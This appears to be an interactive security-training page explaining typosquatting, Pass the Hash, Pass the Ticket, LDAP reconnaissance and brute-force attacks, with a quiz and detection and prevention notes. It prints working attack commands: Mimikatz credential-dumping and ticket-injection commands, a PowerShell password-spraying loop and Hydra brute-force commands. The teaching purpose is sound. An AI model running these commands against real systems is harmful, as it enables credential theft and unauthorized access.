📚 Theory

Typosquatting

Exploiting human typing errors to redirect users to malicious sites

Attack Flow

  1. Choose target — high-traffic site (banks, social media, e-commerce)
  2. Register misspelled domains — often dozens of variations
  3. Clone the legitimate site — CSS, logos, forms look identical
  4. Harvest credentials or push malware

Common Typo Patterns

PatternLegitimateTyposquat
Missing lettergoogle.comgogle.com
Extra letterfacebook.comfaceboook.com
Adjacent keyamazon.comamaxon.com
Swapped letterspaypal.compapyal.com
Wrong TLDmicrosoft.commicrosoft.co

Detection Methods

  • WHOIS monitoring — track newly registered similar domains
  • Typo rules engine — automated alerts on common misspellings
  • SSL certificate validation — check issuer and validity

📚 Theory

Pass the Hash (PtH)

Using stolen NTLM hashes to authenticate without cracking passwords

🔒 Normal Auth

  1. User enters password
  2. System hashes it (NTLM)
  3. Hash compared to stored hash
  4. Access granted if match

🔒‍☠️ PtH Attack

  1. Attacker dumps hashes from memory
  2. Passes hash directly to auth
  3. No password needed!
  4. Lateral movement across network

Key Tools

# Dump hashes with Mimikatz
mimikatz # sekurlsa::logonpasswords

# Pass the hash to remote system
mimikatz # sekurlsa::pth /user:admin /domain:corp.local /rc4:<NTLM_HASH>

# Alternative: psexec with hash
psexec \\target -u admin -p <NTLM_HASH>
NTLM Weakness: Hashes are stored in memory (LSASS process) and can be extracted by any process with admin rights. No forward secrecy — the same hash works even after password change until re-login.

📚 Theory

Pass the Ticket (PtT)

Stealing and reusing Kerberos tickets for unauthorized access

Kerberos Authentication Flow

👤 User
→ AS-REQ →
🎯 KDC
← TGT ←
👤 User
→ TGS-REQ →
🎯 KDC
← TGS ←
🖥 Service

Attack Variants

🆔 Golden Ticket

  • Forged TGT using krbtgt hash
  • Access to any service
  • Valid for 10 years by default
  • Requires domain admin access

🥈 Silver Ticket

  • Forged TGS using service hash
  • Access to specific service only
  • Harder to detect (no KDC contact)
  • Requires service account hash
# Export Kerberos tickets
mimikatz # kerberos::list /export

# Inject stolen ticket
mimikatz # kerberos::ptt ticket.kirbi
⚙ Exercise 3

PtH vs PtT — Classify the Attack

Read each scenario and decide: is it Pass the Hash or Pass the Ticket?

Scenario 1: An attacker extracts an NTLM hash from LSASS memory and uses it to authenticate to a file share on another server.
A Pass the Hash
B Pass the Ticket
Correct! Using an NTLM hash directly for authentication is PtH.
This uses NTLM hashes, not Kerberos tickets — it's Pass the Hash.
Scenario 2: An attacker exports a .kirbi file from memory and injects it into their session to access a SQL server.
A Pass the Hash
B Pass the Ticket
Correct! .kirbi files are Kerberos tickets — this is Pass the Ticket.
.kirbi files are Kerberos ticket exports — this is a Pass the Ticket attack.
Scenario 3: An attacker forges a TGT using the krbtgt account hash and gains access to all domain services for the next 10 years.
A Pass the Hash
B Pass the Ticket (Golden Ticket)
Correct! A Golden Ticket is a forged TGT — a specialized Pass the Ticket attack.
Forging a TGT is a Golden Ticket attack, which falls under Pass the Ticket.

LDAP Reconnaissance

Using LDAP to enumerate Active Directory objects

What Attackers Query

TargetPowerShell CommandRisk
All usersGet-ADUser -Filter *High
Admin accountsGet-ADGroupMember "Domain Admins"Critical
Service accountsGet-ADUser -Filter {ServicePrincipalName -ne "$null"}Critical
ComputersGet-ADComputer -Filter *High
Password policyGet-ADDefaultDomainPasswordPolicyMedium

Password Spraying via LDAP

# Attempt common passwords against all enumerated users
$users = Get-Content users.txt
foreach ($user in $users) {
    $cred = New-Object PSCredential $user, (ConvertTo-SecureString "Spring2026!" -AsPlainText -Force)
    $result = Connect-LDAP -Server DC01 -Credential $cred
    if ($result) { Write-Host "Valid: $user" }
}
Detection: Monitor for bulk LDAP queries, especially from non-admin workstations. Alert on PowerShell commands containing Get-ADUser, Get-ADGroup, or LDAP filter strings.

📚 Theory

Brute Force Attacks

Systematically guessing credentials until access is granted

Attack Types

🔢
Simple Brute Force
Try every possible combination: a, b, c... aa, ab, ac... Very slow but guaranteed eventually.
📖
Dictionary Attack
Use a wordlist of common passwords. Fast but limited to known passwords.
🔄
Hybrid Attack
Dictionary + mutations: Password1, P@ssword, Password2026! Balances speed and coverage.

Hydra — The Go-To Brute Force Tool

# Basic HTTP POST brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# SSH brute force
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# FTP brute force with rate limiting
hydra -l admin -P wordlist.txt -t 4 ftp://192.168.1.100

Prevention

  • Account lockout after 5 failed attempts
  • Rate limiting — max 10 attempts per minute
  • MFA — password alone is not enough
  • IDS/IPS — detect and block attack patterns
  • Strong password policies — minimum 12 characters, complexity rules
